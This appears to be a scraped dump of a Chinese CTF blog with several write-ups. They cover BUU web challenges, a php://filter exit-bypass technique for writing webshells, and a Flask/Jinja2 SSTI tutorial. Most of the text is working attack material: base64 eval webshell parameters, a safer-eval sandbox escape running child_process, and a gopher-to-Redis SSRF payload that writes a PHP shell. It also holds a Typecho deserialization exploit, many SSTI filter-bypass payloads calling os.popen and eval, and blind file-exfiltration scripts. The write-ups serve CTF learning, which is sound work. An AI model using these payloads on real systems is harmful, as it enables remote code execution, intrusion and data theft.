public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); 就是一个很简单的序列化，我们直接base64编码Ginkgo之后的值即可。 1?Ginkgo=cGhwaW5mbygpOw== 审计到PHP的代码，下一步我们会发现自己蚁剑连接不上，没办法，只能自己再写一个shell了 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== 密码是sakani，之后就可以用蚁剑链接上去了，但是我们发现flag没法读啊。而且因为disable_function，我们 没有办法使用虚拟终端了。 但是我们查看版本，版本为PHP7.3，可以尝试用内核漏洞提权，在tmp目录（777），上传exp 1https://github.com/mm0r1/exploits 上传这里的gc漏洞，之后执行命令即可 2.老八小超市儿根据这篇文章可以做出来前半段成功拿到shell： 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html 这里我传入成功之后路径为： 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php 用蚁剑连入，根目录下找到flag却不能读，读atuo.sh可以知道它每分钟会执行一次makeflaghint.py，同时其权限是766，也就是说我们可以改~，那我们去改这个py的内容让他读flag即可，等一分钟，读到flag 3.EzNode就是一个很基础的代码审计： 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 老板说为了后期方便优化app.use((req, res, next) =&gt; &#123; if (req.path === &#x27;/eval&#x27;) &#123; let delay = 60 * 1000; console.log(delay); if (Number.isInteger(parseInt(req.query.delay))) &#123; delay = Math.max(delay, parseInt(req.query.delay)); &#125; const t = setTimeout(() =&gt; next(), delay); // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事 setTimeout(() =&gt; &#123; clearTimeout(t); console.log(&#x27;timeout&#x27;); try &#123; res.send(&#x27;Timeout!&#x27;); &#125; catch (e) &#123; &#125; &#125;, 1000); &#125; else &#123; next(); &#125;&#125;); 注意核心代码在worker2到worker3之间，我们发现如果delay被设置成了60*1000 而超时是1000.如果没有超时，反而会next，也就是会继续执行代码，否则直接弹回去超时，于是我们看下一步 123456789101112app.post(&#x27;/eval&#x27;, function (req, res) &#123; let response = &#x27;&#x27;; if (req.body.e) &#123; try &#123; response = saferEval(req.body.e); &#125; catch (e) &#123; response = &#x27;Wrong Wrong Wrong!!!!&#x27;; &#125; &#125; res.send(String(response));&#125;); 下面使用了saferEval的代码，接收e的参数，于是我们的目标很清晰，首先尝试绕过对超时的限制，再搜一下saferEval的数据~，文档说到： 1parseInt(string, radix) 参数 描述 string 必需。要被解析的字符串。 radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。如果该参数小于 2 或者大于 36，则 parseInt() 将返回 NaN。 这也就说明，如果传入delay是很大很大的数，也就不能被解析了，那我们的delay此时变成了1秒，也就绕过了超时限制，接下来我们就可以命令执行咯，尝试： 发现此时就绕过了超时的限制了！，于是再构造执行EvalSafer的代码，查到是CVE-2019-10769 1https:&#x2F;&#x2F;github.com&#x2F;commenthol&#x2F;safer-eval&#x2F;issues&#x2F;10 payload如下： 123456789const saferEval = require(&quot;./src/index&quot;);const theFunction = function () &#123; const process = clearImmediate.constructor(&quot;return process;&quot;)(); return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()&#125;;const untrusted = `($&#123;theFunction&#125;)()`;console.log(saferEval(untrusted)); 其中核心代码就是theFunction，我们传入进去污染参数即可执行代码 4.EzWeb是一个redis的题目..没有做过这样的，硬着头皮做吧，访问之后根据提示访问 ?secret 查询了一些，这是内网的环境，也就是说虽然题目过滤了127.0.0.1,但是我们可以测试其他靶机的内容 访问过去之后好像也不是啥玩意儿啊,尝试用file协议的漏洞读到了index.php的源码： file:[空格]/ 1?url&#x3D;file:%20&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&amp;submit&#x3D;提交 123456789101112131415161718192021222324&lt;!--?secret--&gt;&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET[&#x27;submit&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; //echo $url.&quot;\\n&quot;; if(preg_match(&#x27;/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is&#x27;, $url,$match)) &#123; //var_dump($match); die(&#x27;别这样&#x27;); &#125; curl($url);&#125;if(isset($_GET[&#x27;secret&#x27;]))&#123; system(&#x27;ifconfig&#x27;);&#125;?&gt; 我们发现过滤了dict协议，file协议，但是没有过滤http协议和gopher协议，我们猜想出题人想让我们利用http协议进行内网探测，gopher协议进行攻击,果然，在11端口上找到了变化 让我们尝试服务，因为ssrf常用的几个服务就是mysql和redis，于是分别访问3306端口和6379端口 6379上得到： 发现果然有ERR端口，于是尝试用gopher协议打一波，这里直接用了一波别人的脚本 1234567891011121314151617181920212223242526272829303132import urllibprotocol=&quot;gopher://&quot;ip=&quot;173.96.119.11&quot; // 运行有redis的主机ipport=&quot;6379&quot;shell=&quot;\\n\\n&lt;?php system(\\&quot;cat /flag\\&quot;);?&gt;\\n\\n&quot;filename=&quot;shell.php&quot;path=&quot;/var/www/html&quot;passwd=&quot;&quot;cmd=[&quot;flushall&quot;, &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)), &quot;config set dir &#123;&#125;&quot;.format(path), &quot;config set dbfilename &#123;&#125;&quot;.format(filename), &quot;save&quot; ]if passwd: cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;def redis_format(arr): CRLF=&quot;\\r\\n&quot; redis_arr = arr.split(&quot; &quot;) cmd=&quot;&quot; cmd+=&quot;*&quot;+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 我们改一下主机IP为:10.160.187.11 得到payload: 1gopher:&#x2F;&#x2F;10.160.187.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A 5.EZ三剑客-EzTypecho这道题目，呃，原理比较难，但是利用起来却很简单，比如在这篇文章中可以找到： 1https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;155753.html exp就可以找到了，在做题的时候直接在finish时会发现无法利用的情况 这个时候就必须看源码了 查找session，在源码中可以找到： 12345678910 &lt;?php else : ?&gt; &lt;?php//if(!isset($_SESSION)) &#123; die(&#x27;no, you can\\&#x27;t unserialize it without session QAQ&#x27;);&#125; $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); Typecho_Cookie::delete(&#x27;__typecho_config&#x27;); $db = new Typecho_Db($config[&#x27;adapter&#x27;], $config[&#x27;prefix&#x27;]); $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE); Typecho_Db::set($db); ?&gt; 我们去查找sesion在哪里赋值： 结果发现一旦在这里就被exit停下来了，于是查找start，结果发现源码当中： 1234&lt;?php $config = unserialize(base64_decode(Typecho_Cookie::get(&#x27;__typecho_config&#x27;))); $type = explode(&#x27;_&#x27;, $config[&#x27;adapter&#x27;]); $type = array_pop($type); 发现它居然接收一个参数…那这样的话我们用这个去打就行了，利用脚本： 123456789101112131415161718192021222324252627282930313233343536373839&lt;?phpclass Typecho_Feed&#123; private $_type; private $_items = array(); public function __construct()&#123; $this-&gt;_type = &quot;RSS 2.0&quot;; $this-&gt;_items = array( array( &quot;title&quot; =&gt; &quot;test&quot;, &quot;link&quot; =&gt; &quot;test&quot;, &quot;data&quot; =&gt; &quot;20190430&quot;, &quot;author&quot; =&gt; new Typecho_Request(), ), ); &#125;&#125;class Typecho_Request&#123; private $_params = array(); private $_filter = array(); public function __construct()&#123; $this-&gt;_params = array( &quot;screenName&quot; =&gt; &quot;eval(&#x27;echo `cat /flag`;exit();&#x27;)&quot;, ); $this-&gt;_filter = array(&quot;assert&quot;); &#125;&#125;$a = new Typecho_Feed();$c = array( &quot;adapter&quot; =&gt; $a, &quot;prefix&quot; =&gt; &quot;test&quot;,);echo base64_encode(serialize($c)); 拿到flag： 总结：​ 题目虽然原理都很难，但是利用却很简单，自己先把题目成功的复现接出来了，以后再逐步复现原理把。","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"渗透","slug":"渗透","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"反序列化","slug":"反序列化","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"全国工控2020-web-easyphp","slug":"全国工控2020-web-easyphp","date":"2020-10-27T06:25:53.000Z","updated":"2020-11-17T06:15:26.691Z","comments":true,"path":"2020/10/27/全国工控2020-web-easyphp/","link":"","permalink":"http://example.com/2020/10/27/%E5%85%A8%E5%9B%BD%E5%B7%A5%E6%8E%A72020-web-easyphp/","excerpt":"","text":"全国工控2020-web-easyphp1.从伪协议开始说起php://filter是PHP中独有的协议，该协议流允许我们作为一个中间流来处理其他流， 在之前三个白帽中有一个比赛，其中一部分的代码： 1234&lt;?php$content = &#x27;&lt;?php exit; ?&gt;&#x27;;$content .= $_POST[&#x27;txt&#x27;];file_put_contents($_POST[&#x27;filename&#x27;], $content); 1.base64在这里我们可以看见，如果正常的编译代码，由于在开头加入了exit内容，即使我们写入了一句话也无法解析。 但是我们可以通过filename在php写入的时候构造协议，所以利用base64-decode方法解码构造一句话的payload： 1PD9waHAgcGhwaW5mbygpOyA&#x2F;Pg&#x3D;&#x3D; 但是在这里我们又会发现如果直接打入进去，base64解析没有成功，这就是因为base是由4字节组成一次payload。所以话说回去， 当我们使用base64decode协议的时候，&lt; ? ; ?&gt;等等都不会被解析，所以源代码则会被识别为： phpexit，而base64是四个字节还原成一个字母，故我们需要再占一个位数，给她，也就是phpexit[?]构造成八个字节供basedecode使用，之后在后面再编上我们自己的payload，所以这道题可以构造如下： 1filename=php://filter/write=convert.base64-decode/resource=shell.php&amp;txt=cPD9waHAgcGhwaW5mbygpOyA/Pg== 但是这里仍需要注意，我们构造的时候payload当中不允许出现+号等特殊字符，否则会遇见没有被写上去情况。，实际上，除了base过滤器，还有很多过滤器可以供给我们使用： 官网： 123https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.php 过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.convert.php 转换过滤器https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;filters.string.php 字符过滤器 2.rot13除此之外我尝试使用rot13来绕过，但是会发现rot13之后的结果不合法 1filename=php://filter/write=string.rot13/resource=shell.php&amp;txt=&lt;?cuc cucvasb();?&gt; 得到php为： 1&lt;?cuc rkvg; ?&gt;&lt;?php phpinfo();?&gt; 这样的话，因为多了一个分号，而导致失败了（开启短标签的情况下，只要用&lt;? ?&gt;中的内容就会被解析）但如果关闭短标签的情况下： 1txt=?&gt;&lt;?cuc cucvasb();?&gt;&amp;filename=php://filter/write=string.rot13/resource=shell.php 成功！除此之外，还补充一种骚思路： 3.iconv字符编码转换1echo iconv(&quot;utf-8&quot;,&quot;utf-7&quot;,&quot;&lt;?php phpinfo(); ?&gt;&quot;) iconv函数接收三个参数，当前编码，转换后编码，之后再转回去，所以利用该特性，我们可以反其道行之。但是在这里，利用该字符编码，会导致出现之前的+号的问题，于是就失败了 1filename=php://filter/write=convert.utf-7.utf-8/resource=shell.php&amp;txt=?+AD4-+ADw?php phpinfo()+ADs ?+AD4- 根据大佬给出的UCS2-2 编码的方式： 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php phpinfo();?&gt;&#x27;); 需要注意的是，UCS2的编码方式是2位一次转换，所以我们必须保证需要转换的编码为2位数，不够的我们可以使用空格占位,而我们上面的转换之后直接用的话，会发现无法转换，这是因为必须保证&lt;?php exit();也被成功转换，所以我们再前面再加上一个1即可， 最终payload： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp phpipfn(o;)&gt;? 写入shell： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&amp;txt=1?&lt;hp+pvela$(P_SO[T]1;)&gt;? 4.组合使用： 1filename=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;? 还可以尝试使用srtip_tags+base64的方式进行绕过 1filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg== 经过该方式构造的payload，会进行strip_tags，去除掉了前面的内容，之后再用base64解压了我们的内容。 讲完上面的，再回到wmctf的check in2，题目的源码为： 123456789101112&lt;?phperror_reporting(0);highlight_file(__FILE__);if (isset($_GET[&#x27;content&#x27;])) &#123; $content = $_GET[&#x27;content&#x27;]; if (preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\\.\\./i&#x27;, $content)) die(&#x27;hacker&#x27;); if (file_exists($content)) require_once($content); file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);&#125; 过滤器过滤了很多，我们只剩下了压缩过滤器，我们可以通过zlib.inflate解压字符，之后再利用zlib.deflate压缩的方式getshell，str.tolower会在 1php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt; 除此之外，还有二次编码绕过的方式 1http://localhost/?content=php://filter/write=string.%7%32ot13|?&gt;&lt;?cuc cucvasb();?&gt;|/resource=shell.php 而昨天的比赛过滤了tolower,upper等等，甚至又把%过滤了，导致我们没法用上面两个payload了，但是我们依然可以利用zlib的 deflate，之后再利用url编码解析，得出如下payload 123php://filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%28%50%28%ae%2c%2e%49%cd%d5%50%89%77%77%0d%89%8e%8f%d5%b4%b6%b7%03%3C%3F/resource=shell.php","categories":[],"tags":[{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"}]},{"title":"FlaskSSti","slug":"FlaskSSti","date":"2020-10-27T06:01:27.000Z","updated":"2020-11-17T06:19:55.707Z","comments":true,"path":"2020/10/27/FlaskSSti/","link":"","permalink":"http://example.com/2020/10/27/FlaskSSti/","excerpt":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做","text":"一直对ssti比较模糊，遇见的时候都是网上去照抄payload去打，自己没有什么主动构造payload的能力，这次遇见一道题决定总结一些该怎么做 1.hackbar 自带的payload如何构成的第一件事情，就是搭建我们的环境： 123456789101112131415from flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def index(): id = request.args.get(&quot;id&quot;) html = &#x27;&#x27;&#x27;&lt;h1&gt;%s&lt;/h1&gt; &#x27;&#x27;&#x27; % (id) return render_template_string(html)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 这种就是最基本的flask，在flask当中jinjia的模板，我们使用两个花括号就可以允许一些基本的运算 用于执行if，for循环等等，那么我们一个最基本的payload的构造方式是该怎么触发呢？第一步，从config类触发，因为Flask里面自带 1http://localhost/?id=&#123;&#123; config.items() &#125;&#125; 通过这个类我们可以得到所有的flask的config~，而这一的意义好像不是很大？我们得不到很多东西，但是我们可以用这个作为跳板，执行下一步 1.__class__.__init__ __class方法属性的时候会只想该实例对应的类，此时config的类是Config,然后可以再去调用其它类属性，如果我们审计了源码，就可以知道我们此时的Config类位于config.py80多行，当我们执行__init__之后，便可以在下面的101行找到这么一行代码： 1rv = os.environ.get(variable_name) 也就是说，我们的config类当中含有os库的方法，如果我们直接使用是不行的，但我们可以通过globals函数先获取到它，于是得到： globals() 函数会以字典类型返回当前位置的全部全局变量,在交互模式下： 1__globals__ 于是我们拼接得到如下的payload: 1config.__class__.__init__.__globals__ 可以得到： 我们用下面这个方式来获取os库，利用__dict这个方法来查看os库哪些可以给我们进行使用 1.__globals__[&#x27;os&#x27;] 我们能够找到system，但是我们用该方法却无法得到回显，该方法只不过是成功的时候返回1，失败了则是返回0 执行如下： 12http://localhost/?id=&#123;&#123;%20config.__class__.__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir()&#x27;)&#125;&#125; 得到1或者0对于我们来说意义不大，当然这样也可以进行盲注【，而popen则可以返回文件对象 os.popen 该方法不但执行命令还返回执行后的信息对象，是通过一个管道文件将结果返回。 output = os.popen(‘cat /proc/cpuinfo’) print output.read() 于是我们构造最终的payload： 1&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;dir()&#x27;).read()&#125;&#125; 1.2 config以外的思路其他的一些思路，首先，我们的config被过滤了，我们该怎么办呢？除此之外，我们还可以通过()和’’分别获取到tuple和str的初始化~ 12&#x27;&#x27;.__class__.__name__ #得到str()_.__class__.__name__ #tuple 这时引入base和mro的魔术方法 12bases : 类的基类的元组，顺序为它们在基类列表中出现的顺序（基类就是Object类~）mro :类的父类，从父类网上找，最终会找到基类，所以mro[-1]等价于__bases__ 这时候我们就想到的，我们既然得到了基类，是不是就想要所有的子类了呢？毕竟子类的内容我们更加感兴趣，我们最终的目标就是找到os库对吧。而python正好拥有这个魔术方法 1__subclasses__ #获取所有的子类方法 之后慢慢去寻找即可，该文章中有，在catch_warnnings模块下含有builtins，我们可以用这个去找eval： 12&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;dir()&#39;).read()&quot;) &#125;&#125; 1.3总结做题的思路：总而言之，我们要么去找builtins函数下的eval，要么去找os。 1str&#x3D; %EF%B9%9B%EF%B9%9Bself.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read()%EF%B9%9C%EF%B9%9C 2.谈谈过滤在某些情况下，会遇见各种各样的过滤，比如我们遇见对config的过滤，以及os过滤啊等等 2.1 过滤了os，system等的情况在这种情况下我们也不需慌，如果只是对中括号中可能用到的内容进行过滤的话，我们完全可以通过拼接绕过： 比如我们之前的payload修改成： 1?id=&#123;&#123; config.__init__.__globals__[&#x27;o&#x27;+&#x27;s&#x27;].popen(&#x27;dir&#x27;).read() &#125;&#125; 2.2 过滤了中括号这样的话,可以用getitem方法，该方法等价于一个迭代器的选择，开发者的原意是让人们可以用这个迭代对象,这篇文章讲的不错 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_24805141&#x2F;article&#x2F;details&#x2F;81411775 Python的魔法方法__getitem__ 可以让对象实现迭代功能，这样就可以使用for...in... 来迭代该对象了，同时也允许我们利用gettiem来直接选择内容,所以我们之前的payload： 1&#123;&#123; config.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() &#125;&#125; 利用request起步 1&#123;&#123; request.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(192).__init__.__globals__.__builtins__.__getitem__(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125; 2.3 过滤了.号这个可以使用attr来进行绕过了，直接给出绕过方法： 所以之前的payload进行对比： 12345[].__class__ = []|attr(__class__)&#123;&#123;[]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)() &#125;&#125;&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[190] &#125;&#125; 12&#123;&#123; ([]|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[192]|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__builtins__&#x27;)|attr(__getitem__)(&#x27;eval&#x27;) &#125;&#125; # 拼到这里拼不下去了。。请问有人知道为什么嘛,eval无论如何都取不到了 不知道为什么在我从上往下继续取值的时候，怎么都没法继续向下取值了。但是看见可以转换思路 2.5利用request​ 因为flask此时能允许用户自定义输出，十有八九是有request的，所以我们去利用这个也不是相当不错的 这里翻阅到了一个老外思路，但是他没给全。 1http://localhost/?id=&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)|attr(&#x27;__base__&#x27;) &#125;&#125;&amp;class=class&amp;usc=_&amp;init=init 利用request的思路去重新把payload拼出来 1?id=&#123;&#123;[][request[&#x27;args&#x27;][&#x27;class&#x27;]][request[&#x27;args&#x27;][&#x27;base&#x27;]][request[&#x27;args&#x27;][&#x27;subclasses&#x27;]]()[153][request[&#x27;args&#x27;][&#x27;dict&#x27;]][request[&#x27;args&#x27;][&#x27;init&#x27;]][request[&#x27;args&#x27;][&#x27;globals&#x27;]][request[&#x27;args&#x27;][&#x27;builtins&#x27;]][&#x27;eval&#x27;](request[&#x27;args&#x27;][&#x27;payload&#x27;])&#125;&#125;&amp;base=__base__&amp;subclasses=__subclasses__&amp;dict=__dict__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;class=__class__&amp;payload=__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read() 2.4将中括号和.号都过滤情况下当然上面的难度都是相当简单的题目才会遇见了，在当前环境下，往往会过滤的相当严格，我们应该从flask本身出现的类开始找，比如题目可能验证的时候，仅仅验证我们输入的id。但是我们可以利用此，让flask读取header中的内容，这样就可以打破限制 我们可以先写一个脚本： 123456789101112http://localhost/?id=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;dir()&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 之后为了绕过括号的限制，采用这种方法： 这里给出一个payload： 12345678910111213141516171819&#123;% for c in []|attr(request.headers.x1)|attr(request.headers.x2)|attr(request.headers.x3)() %&#125; &#123;% if c|attr(request.headers.x4)==request.headers.x5 %&#125; &#123;%for d in ((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])%&#125; &#123;%if d==request.headers.x9%&#125;&#123;&#123;((c|attr(request.headers.x6)|attr(request.headers.x7))[request.headers.x8])[d](request.headers.x13)&#125;&#125; &#123;% endif %&#125; &#123;% endfor %&#125; &#123;% endif%&#125;&#123;% endfor %&#125; x13: __import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()x9: evalx8: __builtins__x7: __globals__x6: __init__x5: catch_warningsx4: __name__x3: __subclasses__x2: __base__x1: __class__ 2.6 过滤了单引号和双引号的情况在这种情况下，我们就只能去尝试查找各类的open函数了，没有办法执行命令了，于是查找到： 1self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read() 之后为了绕过引号的过滤，我们尝试使用request.args.x1的方式进行绕过 拼凑得： 2.7 读取文件1?id=&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1=flag 而实际上，我发现中括号也是可以进行替代的 1&#123;&#123; [].__class__.__mro__[-1].__subclasses__()[192].__init__.__globals__. __builtins__[request.args.x1](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir()&#x27;).read()&quot;) &#125;&#125;&amp;x1=eval 拼凑得出： 1&#123;&#123; config.__class__.__init__.__globals__[request.args.x1].popen(request.args.x2).read() &#125;&#125;&amp;x1=os&amp;x2=dir 2.8过滤了eval，popen，两个左花括号这里记录一下自己学习到的一道题目： 上海市网络安全大赛：123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask,request,render_templatefrom jinja2 import Templateimport osapp = Flask(__name__)f = open(&#x27;/flag&#x27;,&#x27;r&#x27;)flag = f.read()@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def home():__ name = request.args.get(&quot;name&quot;) or &quot;&quot; print(name) if name: return render_template(&#x27;index.html&#x27;,name=name) else: return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])def help(): help = &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; return f.read()@app.errorhandler(404)def page_not_found(e): #No way to get flag! os.system(&#x27;rm -f /flag&#x27;) url = name = request.args.get(&quot;name&quot;) or &quot;&quot; r = request.path r = request.data.decode(&#x27;utf8&#x27;) if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: t = Template(&quot; Not found!&quot;) return render_template(t), 404 t = Template(r + &quot; Not found!&quot;) return render_template(t), 404if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;,port=8888) 这道题比较新有意思的点在两个地方： 过滤了这个地方： 1if &#x27;eval&#x27; in r or &#x27;popen&#x27; in r or &#x27;&#123;&#123;&#x27; in r: 过滤了{ {} },这样子的情况以前自己没有遇过，后来知道可以进行盲注，并且我们可以尝试读取文件，读取文件的payload如下： 1&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125; 如果满足条件，则会输出p0，否则就不会输出。第二点，我们该读取什么文件呢？ 这里运用了os.system(“rm -f /flag”) 默认的进程删除后会存放在暂时文件中，进程为： 1/proc/self/fd/3 故编写脚本如下： 12345678910111213141516171819202122import requestsimport stringurl = &#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;headers=&#123; &#x27;Content-Type&#x27;:&#x27;application/json&#x27;&#125;def check(payload): r = requests.post(url, data=payload,headers=headers).text return &#x27;~p0~&#x27; in rpassword = &#x27;&#x27;sa=string.printable#print(s)for i in range(0,100): for c in sa: payload=&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27; + str(i) + &#x27;:&#x27; + str( i + 1) + &#x27;] == &quot;&#x27; + c + &#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) if check(payload): password += c break print(password) 脚本： 123456789101112131415161718import requests,stringurl = &quot;http://localhost:8080&quot;list = string.ascii_letters + string.digits+ &quot;-/_&#123;&#125;&quot;flag = &quot;&quot;for i in range(999): for j in list: payload = &#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;flag&quot;).read()[&#x27;+str(i)+&quot;:&quot;+str(i+1)+&#x27;] == &quot;&#x27;+j+&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27; # print(payload) data =&#123;&quot;id&quot;:payload&#125; res = requests.get(url,params=data).text # print(res) if &quot;~p0~&quot; in res: i+=1 flag+=j print(&quot;flag:&quot; + flag) break 2.8过滤了空格，requestspayload基本没有变动，在这种情况下还被恶心了一下request，所以我们应该这样用： 原本正常的payload 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(request.args.x1).read() &#125;&#125;&amp;x1&#x3D;flag 改造后： 1?id&#x3D;&#123;&#123; self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;cat\\x20&#x2F;flag&quot;).read() &#125;&#125;","categories":[],"tags":[{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]},{"title":"Vue总结","slug":"Vue总结","date":"2020-10-25T13:28:49.000Z","updated":"2020-11-17T06:08:39.740Z","comments":true,"path":"2020/10/25/Vue总结/","link":"","permalink":"http://example.com/2020/10/25/Vue%E6%80%BB%E7%BB%93/","excerpt":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么","text":"Vue part总结了前端项目的搭建，以及自己在这次作品中学到了什么 